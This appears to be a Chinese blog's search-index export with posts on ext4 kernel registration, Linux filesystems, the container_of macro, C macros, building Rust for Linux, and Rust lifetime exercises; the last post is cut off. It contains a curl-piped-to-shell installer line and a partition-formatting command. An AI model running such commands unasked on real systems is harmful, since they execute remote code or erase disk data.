VFS 层注册该文件系统，文件系统可能是以内核模块的形式存在（不确定） 前面的文章中分析了vfs和tmpfs文件系统，但是tmpfs作为文件系统比较特殊，所以本文以ext4文件系统来分析文件系统的实现原理。 注册文件系统ext4模块初始化 super.c - fs&#x2F;ext4&#x2F;super.c - Linux source code (v6.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879static int __init ext4_init_fs(void)&#123; int i, err; ratelimit_state_init(&amp;ext4_mount_msg_ratelimit, 30 * HZ, 64); ext4_li_info = NULL; /* Build-time check for flags consistency */ ext4_check_flag_values(); for (i = 0; i &lt; EXT4_WQ_HASH_SZ; i++) init_waitqueue_head(&amp;ext4__ioend_wq[i]); err = ext4_init_es(); if (err) return err; err = ext4_init_pending(); if (err) goto out7; err = ext4_init_post_read_processing(); if (err) goto out6; err = ext4_init_pageio(); if (err) goto out5; err = ext4_init_system_zone(); if (err) goto out4; err = ext4_init_sysfs(); if (err) goto out3; err = ext4_init_mballoc(); if (err) goto out2; err = init_inodecache(); if (err) goto out1; err = ext4_fc_init_dentry_cache(); if (err) goto out05; register_as_ext3(); register_as_ext2(); err = register_filesystem(&amp;ext4_fs_type); if (err) goto out; return 0;out: unregister_as_ext2(); unregister_as_ext3(); ext4_fc_destroy_dentry_cache();out05: destroy_inodecache();out1: ext4_exit_mballoc();out2: ext4_exit_sysfs();out3: ext4_exit_system_zone();out4: ext4_exit_pageio();out5: ext4_exit_post_read_processing();out6: ext4_exit_pending();out7: ext4_exit_es(); return err;&#125;module_init(ext4_init_fs) 看到其中的register_filesystem(&amp;ext4_fs_type) 这行代码是向vfs注册ext4文件系统 123456789static struct file_system_type ext4_fs_type = &#123; .owner = THIS_MODULE, .name = &quot;ext4&quot;, .init_fs_context = ext4_init_fs_context, .parameters = ext4_param_specs, .kill_sb = ext4_kill_sb, .fs_flags = FS_REQUIRES_DEV | FS_ALLOW_IDMAP,&#125;;MODULE_ALIAS_FS(&quot;ext4&quot;);","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"学习 Linux 文件系统 简介","slug":"学习-Linux-文件系统-简介","date":"2023-11-20T08:00:52.000Z","updated":"2023-12-15T06:55:55.714Z","comments":true,"path":"2023/11/20/学习-Linux-文件系统-简介/","link":"","permalink":"http://example.com/2023/11/20/%E5%AD%A6%E4%B9%A0-Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E7%AE%80%E4%BB%8B/","excerpt":"在LINUX系统中有一个重要的概念：一切都是文件。 其实这是UNIX哲学的一个体现，而Linux是重写UNIX而来，所以这个概念也就传承了下来。在UNIX系统中，把一切资源都看作是文件，包括硬件设备。UNIX系统把每个硬件都看成是一个文件，通常称为设备文件，这样用户就可以用读写文件的方式实现对硬件的访问。这样带来优势也是显而易见的： 实现了设备无关性。 UNIX 权限模型也是围绕文件的概念来建立的，所以对设备也就可以同样处理了。 文件系统控制数据的读和写。如果没有文件系统，储存介质里的信息就会变成一块无法理解的数据。通过把数据分块、命名，不同的信息就可以被隔离、分辨。每组数据被命名为“文件”是取自纸质信息系统的命名方式。而“文件系统”是指用于管理信息的分组和命名的结构和逻辑规则。","text":"在LINUX系统中有一个重要的概念：一切都是文件。 其实这是UNIX哲学的一个体现，而Linux是重写UNIX而来，所以这个概念也就传承了下来。在UNIX系统中，把一切资源都看作是文件，包括硬件设备。UNIX系统把每个硬件都看成是一个文件，通常称为设备文件，这样用户就可以用读写文件的方式实现对硬件的访问。这样带来优势也是显而易见的： 实现了设备无关性。 UNIX 权限模型也是围绕文件的概念来建立的，所以对设备也就可以同样处理了。 文件系统控制数据的读和写。如果没有文件系统，储存介质里的信息就会变成一块无法理解的数据。通过把数据分块、命名，不同的信息就可以被隔离、分辨。每组数据被命名为“文件”是取自纸质信息系统的命名方式。而“文件系统”是指用于管理信息的分组和命名的结构和逻辑规则。 文件系统有很多，每个磁盘分区可以而且只可以使用其中的某一个。每种文件系统有自己的优缺点和独有特性。 Linux磁盘分区与目录首先说明一下磁盘的物理组成，整颗磁盘的组成主要有： 圆形的盘片（主要记录数据的部分）； 机械手臂，与在机械手臂上的磁头（可读写盘片上的数据）； 主轴马达，可以转动盘片，让机械手臂的磁头在盘片上读写数据。 从上面我们知道数据储存与读取的重点在于盘片，而盘片上的物理组成则为 扇区（Sector）为最小的物理储存单位，且依据磁盘设计的不同，目前主要有 512Bytes 与 4K 两种格式； 将扇区组成一个圆，那就是柱面（Cylinder）； 早期的分区主要以柱面为最小分区单位，现在的分区通常使用扇区为最小分区单位（每个扇区都有其号码喔，就好像座位一样）； 磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。 MBR 分区表中，第一个扇区最重要，里面有：（1）主要开机区（Master boot record, MBR）及分区表（partition table）， 其中 MBR 占有 446 Bytes，而 partition table 则占有 64 Bytes。 GPT 分区表除了分区数量扩充较多之外，支持的磁盘容量也可以超过 2TB。 至于磁盘的文件名部份，基本上，所有实体磁盘的文件名都已经被仿真成 &#x2F;dev&#x2F;sd[a-p] 的格式，第一颗磁盘文件名为 &#x2F;dev&#x2F;sda。 而分区的文件名若以第一颗磁盘为例，则为 &#x2F;dev&#x2F;sda[1-128] 。除了实体磁盘之外，虚拟机的磁盘通常为 &#x2F;dev&#x2F;vd[a-p] 的格式。 若有使用到软件磁盘阵列的话，那还有 &#x2F;dev&#x2F;md[0-128] 的磁盘文件名。使用的是 LVM 时，文件名则为 &#x2F;dev&#x2F;VGNAME&#x2F;LVNAME 等格式。 Linux发行版本之间的差别很少，差别主要表现在系统管理的特色工具以及软件包管理方式的不同。目录结构基本上都是一样的。 Windows的文件结构是多个并列的树状结构，最顶部的是不同的磁盘（分区），如：C，D，E，F等。 Linux的文件结构是单个的树状结构.可以用tree进行展示。 在Ubuntu下安装tree（sudo apt-get install tree）,并可通过命令来查看。 每次安装系统的时候我们都会进行分区，Linux下磁盘分区和目录的关系如下： 任何一个分区都必须挂载到某个目录上。 目录是逻辑上的区分。分区是物理上的区分。 磁盘Linux分区都必须挂载到目录树中的某个具体的目录上才能进行读写操作。 根目录是所有Linux的文件和目录所在的地方，需要挂载上一个磁盘分区。 如何查看分区和目录使用情况？ 1fdisk -l#查看硬盘分区表 1df #查看分区使用情况 可以看到什么文件系统挂载到哪个文件夹下 1du #查看文件占用空间情况 为什么要分区，如何分区？ 可以把不同资料，分别放入不同分区中管理，降低风险。 大硬盘搜索范围大，效率低 磁盘配合只能对分区做设定 &#x2F;home， &#x2F;var， &#x2F;usr&#x2F;local经常是单独分区，因为经常会操作，容易产生碎片 创建文件系统文件系统可以创建在一个分区上、逻辑容器如 LVM，RAID，或者 dm-crypt 上或普通文件上(参考 Loop设备)。这里描述创建在分区上的情况。 注意： 文件系统可以直接写入到设备上，这样的设备叫做 superfloppy 或者 无分区磁盘。这样做会带来一些约束，特别是用它来 启动 系统。 警告： 创建新文件系统之后，之前存放在该分区的数据会丢失且通常无法找回。请备份所有要保留的数据. 某个分区用来干什么通常会限制能用什么文件系统，比如 EFI分区 就只能用 mkfs.vfat 创建的 FAT32，而包含 /boot 的分区的文件系统要考虑 boot loader 是否支持。 创建文件系统之前，目标分区必须处于未挂载状态。如果你要格式化的分区包含了一个已挂载的文件系统，在 lsblk 命令的 MOUNTPOINT 列中可以看到它。 你可以使用 umount 加上分区的挂载点来卸载这个文件系统： 1umount /mountpoint 查看挂载了的所有文件系统，参考#列出挂载的文件系统。 用 mkfs(8) 创建新的文件系统，类型参见#文件系统类型。如果安装了其他特殊的工具，按照它们的说明来做。比如，以下命令在 /dev/sda1 上创建了一个 ext4 文件系统： 1mkfs.ext4 /dev/sda1 此外，你可以使用 mkfs。这是 mkfs.*fstype* 工具的统一入口。上面的命令等价于： 1mkfs -t ext4 /dev/sda1 提示： 用 mkfs.ext4 的时候可以用 -L 选项来给文件系统设置一个 标签。e2label 用来对已经存在的文件系统改标签。 文件系统在创建之后是有条件地 改变大小（resized）的。比如 XFS 可以扩容，但是不能缩小。参考 Resize capabilities。 创建完成之后新的文件系统就可以挂载到某个目录了。 挂载文件系统当要使用某个设备时，例如要读取硬盘中的一个格式化好的分区、光盘或软件等设备时，必须先把这些设备对应到某个目录上，而这个目录就称为“挂载点（mount point）”，这样才可以读取这些设备，而这些对应的动作就是“挂载”。 将物理分区细节屏蔽掉。用户只有统一的逻辑概念。所有的东西都是文件。mount命令可以实现挂载： 1mount [-fnrsvw] [-t vfstype] [-o options] device dir 如果要手动挂载一个设备上的文件系统到某个目录，用 mount(8)。下面这个例子把 /dev/sda1 挂载到 /mnt： 1mount /dev/sda1 /mnt 挂载之后，在 /mnt 下面就能看见 /dev/sda1 里面的内容。挂载之前 /mnt 文件夹里的内容在挂载之后将会变得不可见，直到 unmount 掉 /dev/sda1。 fstab 描述了如果某个设备存在的话系统应该怎么自动挂载它。如果要修改 /etc/fstab，请阅读 fstab。 如果 /etc/fstab 里描述了一个设备的挂载参数，而用 mount 时只给了设备名字或者挂载点，fstab 里的参数就会自动补上。比如，/etc/fstab 里指示 /dev/sda1 应该挂载到 /mnt，那下面的命令就会把 /dev/sda1 挂载到 /mnt，即使你没有显式指明： 1mount /dev/sda1 或者 1mount /mnt 所有的磁盘分区都必须被挂载上才能使用，那么我们机器上的硬盘分区是如何被挂载的？ 123456789101112/etc/fstab: static file system information.Use &#x27;blkid&#x27; to print the universally unique identifier for adevice; this may be used with UUID= as a more robust way to name devicesthat works even if disks are added and removed. See fstab(5).&lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;/ was on /dev/sda3 during installationUUID=b335de17-d596-4f69-aa45-fb30f0b04061 / ext4 errors=remount-ro 0 1/boot/efi was on /dev/sda2 during installationUUID=CC84-CA47 /boot/efi vfat umask=0077 0 1/swapfile none swap sw 0 0 卸载文件系统用 umount(8) 来卸载文件系统。参数可以是包含文件系统的设备（比如/dev/sda1），也可以是挂载点（比如/mnt）： 1umount /dev/sda1 或者 1umount /mnt 硬链接、软链接软链接和硬链接是我们常见的两种概念： 硬连接：是给文件一个副本，同时建立两者之间的连接关系。修改其中一个，与其连接的文件同时被修改。如果删除其中任意一个其余的文件将不受影响。 软连接:也叫符号连接,他只是对源文件在新的位置建立一个“快捷（借用一下wondows常用词）”，所以，当源文件删除时，符号连接的文件将成为无源之水-&gt;仅仅剩下个文件名了，当然删除这个连接，也不会影响到源文件，但对连接文件的使用、引用都是直接调用源文件的。 区别： 硬链接原文件和新文件的inode编号一致。而软链接不一样。 对原文件删除，会导致软链接不可用，而硬链接不受影响。 对原文件的修改，软、硬链接文件内容也一样的修改，因为都是指向同一个文件内容的。 目录不允许硬链接，如果目录允许硬链接，那么我们完全可以将两个目录链接起来，那么操作系统则在找文件的时候，就会在两个目录跳来跳去，形成死循环。 不能对不同文件系统创建硬链接。 不能对不存在的文件创建硬链接。 可以对目录创建软连接，可以跨文件系统创建软连接，可以对不存在的文件创建软连接。 参考资料 filesystems(5) — Arch manual pages — filesystems（5） — Arch 手册页 (archlinux.org) Linux文件系统详解(文件系统层次、分类、存储结构、存储介质、文件节点inode)_linux 文件系统-CSDN博客 文件系统 - Arch Linux 中文维基 (archlinuxcn.org)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"文件系统","slug":"Linux内核/文件系统","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"学习 Linux container_of()","slug":"学习-Linux-container-of","date":"2023-11-09T07:05:56.000Z","updated":"2023-11-18T08:59:40.290Z","comments":true,"path":"2023/11/09/学习-Linux-container-of/","link":"","permalink":"http://example.com/2023/11/09/%E5%AD%A6%E4%B9%A0-Linux-container-of/","excerpt":"container_of定义container_of.h - include&#x2F;linux&#x2F;container_of.h - Linux source code (v6.6) - Bootlin 1234567891011121314/** * container_of - cast a member of a structure out to the containing structure * @ptr: the pointer to the member. * @type: the type of the container struct this is embedded in. * @member: the name of the member within the struct. * * WARNING: any const qualifier of @ptr is lost. */#define container_of(ptr, type, member) (&#123; \\ void *__mptr = (void *)(ptr); \\ static_assert(__same_type(*(ptr), ((type *)0)-&gt;member) || \\ __same_type(*(ptr), void), \\ &quot;pointer type mismatch in container_of()&quot;); \\ ((type *)(__mptr - offsetof(type, member))); &#125;)","text":"container_of定义container_of.h - include&#x2F;linux&#x2F;container_of.h - Linux source code (v6.6) - Bootlin 1234567891011121314/** * container_of - cast a member of a structure out to the containing structure * @ptr: the pointer to the member. * @type: the type of the container struct this is embedded in. * @member: the name of the member within the struct. * * WARNING: any const qualifier of @ptr is lost. */#define container_of(ptr, type, member) (&#123; \\ void *__mptr = (void *)(ptr); \\ static_assert(__same_type(*(ptr), ((type *)0)-&gt;member) || \\ __same_type(*(ptr), void), \\ &quot;pointer type mismatch in container_of()&quot;); \\ ((type *)(__mptr - offsetof(type, member))); &#125;) 它的主要作用是：根据结构体某一成员的地址，获取这个结构体的首地址。根据宏定义，可知这个宏有三个参数： type 结构体类型 ptr 结构体内member成员的地址 member 结构体内的成员 container_of的用法这个宏在内核中非常重要。在内核中会经常有这样的需求：我们传递给某个函数的参数是某个结构体的成员变量，然后在这个函数中，可能还会用到此结构体的其它成员变量，那么这个时候怎么办呢？我们可以使用 container_of 先通过结构体某一成员的访问找到这个结构体的首地址，然后就可以访问其它成员变量了。 12345678910111213141516171819struct _box_t&#123; double length; // 盒子的长度 double breadth; // 盒子的宽度 double height; // 盒子的高度&#125;;int main(void)&#123; struct _box_t box = &#123;30.0, 20.0, 10.0&#125;; struct _box_t *p_box = NULL; p_box = container_of(&amp;box.height, struct _box_t, height); printf(&quot;%p\\n&quot;, p_box); printf(&quot;length: %f\\n&quot;, p_box-&gt;length); printf(&quot;breadth: %f\\n&quot;, p_box-&gt;breadth); return 0;&#125; 在这个程序中，我们定义一个结构体变量 box，知道了它的成员变量 height 的地址 &amp;box.height，就可以通过 container_of 宏直接获得 box 结构体变量的首地址，然后直接访问 box 结构体的其它成员 p_box-&gt;length 和 p_box-&gt;breadth。 参考 Linux 内核 container_of 宏详解_积步千里的博客-CSDN博客","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"C语言 宏","slug":"C语言-宏","date":"2023-11-08T08:57:20.000Z","updated":"2023-12-15T06:57:36.418Z","comments":true,"path":"2023/11/08/C语言-宏/","link":"","permalink":"http://example.com/2023/11/08/C%E8%AF%AD%E8%A8%80-%E5%AE%8F/","excerpt":"#define相关知识 大致结构 12#define name stuff 自定义名 内容","text":"#define相关知识 大致结构 12#define name stuff 自定义名 内容 宏定义是C&#x2F;C++语言中的一种预处理指令，可以用来定义常量、函数以及代码片段。在代码中合理使用宏定义可以提高代码的可读性、可维护性和可重用性。 定义常量在C&#x2F;C++中，我们经常需要使用一些常量，如π、e等，可以使用宏定义来定义这些常量，例如下面的代码定义了π的值并使用： 12#define PI 3.14159265358979323846double area = PI * r * r; 定义函数在C&#x2F;C++中，我们可以使用宏定义来定义函数。与使用函数定义不同，使用宏定义定义的函数在代码中将被替换为宏定义中的代码片段，从而减少了函数调用的开销，提高了代码的性能。例如下面的代码定义了一个求平方的宏定义： 123#define SQUARE(x) ((x)*(x))int a = 3;int b = SQUARE(a); // b = 9 需要注意的是，使用宏定义定义函数也有一些限制，如不能使用return语句等。 参数化宏定义在C&#x2F;C++中，我们可以使用参数来定义宏定义，从而使宏定义更加灵活和可重用。例如下面的代码定义了一个参数化宏定义，用来比较两个数的大小 12345#define MAX(a, b) ((a) &gt; (b) ? (a) : (b))...int a = 3;int b = 5;int max = MAX(a, b); // max = 5 使用参数化宏定义可以方便地定义一些通用的代码片段，提高代码的可重用性。 使用#ifdef保护宏定义在C&#x2F;C++中，我们可以使用#ifdef来保护宏定义，以防止多次定义或未定义。例如下面的代码使用#ifdef语句来保护一个宏定义： 123#ifndef SQUARE#define SQUARE(x) ((x)*(x))#endif 这段代码的意思是，如果SQUARE宏没有被定义，那么就定义它。如果已经被定义了，那么就跳过这个定义。这样可以避免在多个文件中多次定义同一个宏，从而减少编译错误的发生。 使用宏定义进行调试在C&#x2F;C++中，我们可以使用宏定义来进行调试，以便在需要时打印输出调试信息。例如下面的代码定义了一个宏来输出调试信息： 12345#ifdef DEBUG#define DEBUG_PRINT(x) printf x#else#define DEBUG_PRINT(x) do &#123;&#125; while (0)#endif 这段代码的意思是，如果定义了DEBUG宏，那么就使用printf函数输出调试信息。否则，就使用一个空语句块来忽略这个宏。在代码中使用DEBUG_PRINT宏可以方便地输出调试信息，而在正式发布时只需要将DEBUG宏注释掉即可。 使用宏定义进行字符串拼接在C&#x2F;C++中，我们可以使用宏定义来进行字符串拼接，从而方便地生成一些代码。例如下面的代码定义了一个宏来进行字符串拼接： 1234#define STRINGIFY(x) #x#define STRING_CONCAT(x, y) x##yint STRING_CONCAT(a, 1) = 2;const char* str = STRINGIFY(hello world); 这段代码的意思是，使用STRINGIFY宏可以将一个宏定义转换为字符串，使用STRING_CONCAT宏可以将两个宏定义拼接在一起。在代码中使用这两个宏可以方便地生成一些字符串常量和变量名。 使用宏定义来进行条件编译在C&#x2F;C++中，我们可以使用宏定义来进行条件编译，以便根据不同的条件编译不同的代码。例如下面的代码定义了一个宏来控制是否编译某段代码： 12345#ifdef DEBUG// debug code#else// release code#endif 这段代码的意思是，如果定义了DEBUG宏，那么就编译debug code，否则就编译release code。在代码中使用#ifdef语句可以根据不同的条件编译不同的代码，从而方便地进行调试和发布。 使用宏定义进行类型转换在C&#x2F;C++中，我们可以使用宏定义来进行类型转换，从而方便地将一种类型转换为另一种类型。例如下面的代码定义了一个宏来将一个指针转换为一个整数： 123#define PTR2INT(p) ((int)(intptr_t)(p))int* p = new int(10);int n = PTR2INT(p); 这段代码的意思是，使用PTR2INT宏可以将一个指针转换为一个整数。在代码中使用这个宏可以方便地进行类型转换，从而方便地进行一些操作。 使用宏定义进行位操作在C&#x2F;C++中，我们可以使用宏定义来进行位操作，从而方便地进行一些位运算。例如下面的代码定义了一些宏来进行位操作： 123456789101112#define SET_BIT(x, n) ((x) |= (1 &lt;&lt; (n)))#define CLEAR_BIT(x, n) ((x) &amp;= ~(1 &lt;&lt; (n)))#define TOGGLE_BIT(x, n) ((x) ^= (1 &lt;&lt; (n)))#define TEST_BIT(x, n) ((x) &amp; (1 &lt;&lt; (n)))unsigned int num = 0x12345678;SET_BIT(num, 3); // set the 3rd bit to 1CLEAR_BIT(num, 7); // clear the 7th bit to 0TOGGLE_BIT(num, 15); // toggle the 15th bitif (TEST_BIT(num, 2)) &#123; // test the 2nd bit // do something&#125; 这段代码的意思是，使用SET_BIT宏可以将一个数的某一位设置为1，使用CLEAR_BIT宏可以将一个数的某一位清零，使用TOGGLE_BIT宏可以将一个数的某一位取反，使用TEST_BIT宏可以测试一个数的某一位是否为1。在代码中使用这些宏可以方便地进行位操作，从而方便地进行一些操作。 使用宏定义进行变量定义在C&#x2F;C++中，我们可以使用宏定义来进行变量定义，从而方便地生成一些常量或变量。例如下面的代码定义了一个宏来生成一个常量： 1234#define DEFINE_CONST(type, name, value) \\\\\\\\ const type name = value;DEFINE_CONST(int, MAX_NUM, 100); 这段代码的意思是，使用DEFINE_CONST宏可以方便地生成一个常量，它的类型、名称和值都由宏定义传入。在代码中使用这个宏可以方便地生成一些常量，从而方便地进行一些操作。 使用宏定义进行异常处理在C&#x2F;C++中，我们可以使用宏定义来进行异常处理，从而方便地发现和处理异常。例如下面的代码定义了一个宏来检查一个指针是否为空： 123456789#define CHECK_PTR(ptr) do &#123; if ((ptr) == nullptr) &#123; throw std::invalid_argument(&quot;null pointer&quot;); &#125; &#125; while (0)int* p = nullptr;CHECK_PTR(p); // throw an exception 这段代码的意思是，使用CHECK_PTR宏可以方便地检查一个指针是否为空，如果为空就抛出一个异常。在代码中使用这个宏可以方便地进行异常处理，从而方便地发现和处理异常。 使用宏定义进行多线程编程在C&#x2F;C++中，我们可以使用宏定义来进行多线程编程，从而方便地创建和操作线程。例如下面的代码定义了一个宏来创建一个线程： 1234567891011#define CREATE_THREAD(func, arg) do &#123; std::thread t(func, arg); t.detach(); &#125; while (0)void* thread_func(void* arg) &#123; // do something return nullptr;&#125;CREATE_THREAD(thread_func, nullptr); 这段代码的意思是，使用CREATE_THREAD宏可以方便地创建一个线程，它的函数和参数都由宏定义传入。在代码中使用这个宏可以方便地进行多线程编程，从而方便地创建和操作线程。 参考资料 C&#x2F;C++语言中的宏定义技巧 - 知乎 (zhihu.com) C语言之宏详解（超级详细！）_c语言宏定义详解-CSDN博客","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C语言","slug":"编程语言/C语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"C语言","slug":"C语言","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80/"}]},{"title":"R4L:编译Rust for Linux","slug":"R4L-编译Rust-for-Linux","date":"2023-10-07T08:39:05.000Z","updated":"2023-12-15T06:59:57.993Z","comments":true,"path":"2023/10/07/R4L-编译Rust-for-Linux/","link":"","permalink":"http://example.com/2023/10/07/R4L-%E7%BC%96%E8%AF%91Rust-for-Linux/","excerpt":"获取rust for linux源码可以通过以下命令直接从github上下载源码 1git clone git@github.com:Rust-for-Linux/linux.git","text":"获取rust for linux源码可以通过以下命令直接从github上下载源码 1git clone git@github.com:Rust-for-Linux/linux.git 编译构建内核源码环境部署 基本必备软件安装 12sudo apt install libncurses-dev flex bison openssl libssl-dev \\ dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf 安装rustup 1curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh 配置rustup环境变量（安装完rustup会提醒） 1source &quot;/root/.cargo/env&quot;&quot; 安装rustc 1rustup override set $(scripts/min-tool-version.sh rustc) 1rustup component add rust-src 安装llvm&#x2F;clang套件 1sudo apt install llvm lld libclang-dev 安装bingen 1cargo install --locked --version $(scripts/min-tool-version.sh bindgen) bindgen 配置启用支持rust的内核参数如果上述工具链正确，运行下列命令 1make LLVM=1 rustavailable 则会出现Rust is aviliable那么接下来就可以进行编译内核 执行General setup -&gt; Rust support启用 运行 1make menuconfig 出现图形化界面，如果General setup中没有出现Rust supprot，则按/搜索RUST 可以看到 1Depends on: HAVE_RUST [=y] &amp;&amp; RUST_IS_AVAILABLE [=y] &amp;&amp; !MODVERSIONS [=n] &amp;&amp; !GCC_PLUGINS [=n] &amp;&amp; !RANDSTRUCT [=n] &amp;&amp; (!DEBUG_INFO_BTF [=n] ||PAHOLE_HAS_LANG_EXCLUDE [=n]) 所以根据这个可以得到： HAVE_RUST &#x3D; y RUST_IS_AVAILABLE &#x3D; y MODVERSIONS &#x3D; n GCC_PLUGINS &#x3D; n RANDSTRUCT &#x3D; n (!DEBUG_INFO_BTF [&#x3D;n] ||PAHOLE_HAS_LANG_EXCLUDE [&#x3D;n])也就是说 DEBUG_INFO_BTF &#x3D; n或者PAHOLE_HAS_LANG_EXCLUDE &#x3D; y 如果上述条件没有达成，则按/搜索对应的条件，并进行修改，修改完成之后就可以找到Rust Support选项 Kernel hacking-&gt;Sample kernel code-&gt;Rust sample 启用 之后退出并保存 编译源码1make LLVM=1 -j$(nproc) 错误解决 ERROR: modpost: “riscv_cbom_block_size” undefined 该错误出现在编译虚拟化模块kvm时出现，在内核配置中关掉这个模块即可: “Kernel-based Virtual Machine (KVM) support” make[3]: *** No rule to make target ‘debian&#x2F;canonical-certs.pem’, needed by ‘certs&#x2F;x509_certificate_list’. Stop. 编辑.config文件(刚才在终端中执行过配置内核的命令#make menuconfig 后会在该目录下生成一个隐藏文件.config) 修改CONFIG_SYSTEM_TRUSTED_KEYS，将其赋空值 修改前： 1CONFIG_SYSTEM_TRUSTED_KEYS=&quot;debian/canonical-certs.pem&quot; 修改后： 1CONFIG_SYSTEM_TRUSTED_KEYS=&quot;&quot; make[3]: *** No rule to make target ‘debian&#x2F;canonical-revoked-certs.pem’, needed by ‘certs&#x2F;x509_revocation_list’. Stop. 参考错误2","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"Rust for Linux","slug":"Linux内核/Rust-for-Linux","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/Rust-for-Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习14 生命周期进阶","slug":"Rust学习-练习14-生命周期进阶","date":"2023-09-27T01:19:11.000Z","updated":"2023-11-24T03:10:48.171Z","comments":true,"path":"2023/09/27/Rust学习-练习14-生命周期进阶/","link":"","permalink":"http://example.com/2023/09/27/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A014-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%BF%9B%E9%98%B6/","excerpt":"&amp;’static and T: ‘static&#39;static 是一个 Rust 保留的生命周期名称，在之前我们可能已经见过好几次了: 12345678#![allow(unused)]fn main() &#123;// 引用的生命周期是 &#x27;static :let s: &amp;&#x27;static str = &quot;hello world&quot;;// &#x27;static 也可以用于特征约束中:fn generic&lt;T&gt;(x: T) where T: &#x27;static &#123;&#125;&#125;","text":"&amp;’static and T: ‘static&#39;static 是一个 Rust 保留的生命周期名称，在之前我们可能已经见过好几次了: 12345678#![allow(unused)]fn main() &#123;// 引用的生命周期是 &#x27;static :let s: &amp;&#x27;static str = &quot;hello world&quot;;// &#x27;static 也可以用于特征约束中:fn generic&lt;T&gt;(x: T) where T: &#x27;static &#123;&#125;&#125; 虽然它们都是 &#39;static，但是也稍有不同。 &amp;’static作为一个引用生命周期，&amp;&#39;static 说明该引用指向的数据可以跟程序活得一样久，但是该引用的生命周期依然有可能被强转为一个更短的生命周期。 🌟🌟 有好几种方法可以将一个变量标记为 &#39;static 生命周期, 其中两种都是和保存在二进制文件中相关( 例如字符串字面量就是保存在二进制文件中，它的生命周期是 &#39;static )。 1234567891011/* 使用两种方法填空 */fn main() &#123; __; need_static(v); println!(&quot;Success!&quot;)&#125;fn need_static(r : &amp;&#x27;static str) &#123; assert_eq!(r, &quot;hello&quot;);&#125; My Answer 1234567891011/* 使用两种方法填空 */fn main() &#123; let v = &quot;hello&quot;; need_static(v); println!(&quot;Success!&quot;)&#125;fn need_static(r : &amp;&#x27;static str) &#123; assert_eq!(r, &quot;hello&quot;);&#125; 12345678910fn main() &#123; const v: &amp;str = &quot;hello&quot;; need_static(v); println!(&quot;Success!&quot;)&#125;fn need_static(r : &amp;&#x27;static str) &#123; assert_eq!(r, &quot;hello&quot;);&#125; 🌟🌟🌟🌟 使用 Box::leak 也可以产生 &#39;static 生命周期 1234567891011121314151617181920212223#[derive(Debug)]struct Config &#123; a: String, b: String,&#125;static mut config: Option&lt;&amp;mut Config&gt; = None;/* 让代码工作，但不要修改函数的签名 */fn init() -&gt; Option&lt;&amp;&#x27;static mut Config&gt; &#123; Some(&amp;mut Config &#123; a: &quot;A&quot;.to_string(), b: &quot;B&quot;.to_string(), &#125;)&#125;fn main() &#123; unsafe &#123; config = init(); println!(&quot;&#123;:?&#125;&quot;,config) &#125;&#125; Answer 123456789101112131415161718192021222324#[derive(Debug)]struct Config &#123; a: String, b: String,&#125;static mut config: Option&lt;&amp;mut Config&gt; = None;fn init() -&gt; Option&lt;&amp;&#x27;static mut Config&gt; &#123; let c = Box::new(Config &#123; a: &quot;A&quot;.to_string(), b: &quot;B&quot;.to_string(), &#125;); Some(Box::leak(c))&#125;fn main() &#123; unsafe &#123; config = init(); println!(&quot;&#123;:?&#125;&quot;,config) &#125;&#125; 🌟 &amp;&#39;static 只能说明引用指向的数据是能一直存活的，但是引用本身依然受限于它的作用域 1234567891011fn main() &#123; &#123; // 字符串字面量能跟程序活得一样久，因此 `static_string` 的生命周期是 `&#x27;static` let static_string = &quot;I&#x27;m in read-only memory&quot;; println!(&quot;static_string: &#123;&#125;&quot;, static_string); // 当 `static_string` 超出作用域时，该引用就无法再被使用，但是引用指向的数据( 字符串字面量 ) 依然保存在二进制 binary 所占用的内存中 &#125; println!(&quot;static_string reference remains alive: &#123;&#125;&quot;, static_string);&#125; My Answer 123456789fn main() &#123; // 字符串字面量能跟程序活得一样久，因此 `static_string` 的生命周期是 `&#x27;static` let static_string = &quot;I&#x27;m in read-only memory&quot;; println!(&quot;static_string: &#123;&#125;&quot;, static_string); // 当 `static_string` 超出作用域时，该引用就无法再被使用，但是引用指向的数据( 字符串字面量 ) 依然保存在二进制 binary 所占用的内存中 println!(&quot;static_string reference remains alive: &#123;&#125;&quot;, static_string);&#125; Answer 1234567fn main() &#123; // Make a `string` literal and print it: let static_string = &quot;I&#x27;m in read-only memory&quot;; println!(&quot;static_string: &#123;&#125;&quot;, static_string); println!(&quot;static_string reference remains alive: &#123;&#125;&quot;, static_string);&#125; &amp;&#39;static 可以被强转成一个较短的生命周期 示例 12345678910111213141516171819// 声明一个 static 常量，它拥有 `&#x27;static` 生命周期.static NUM: 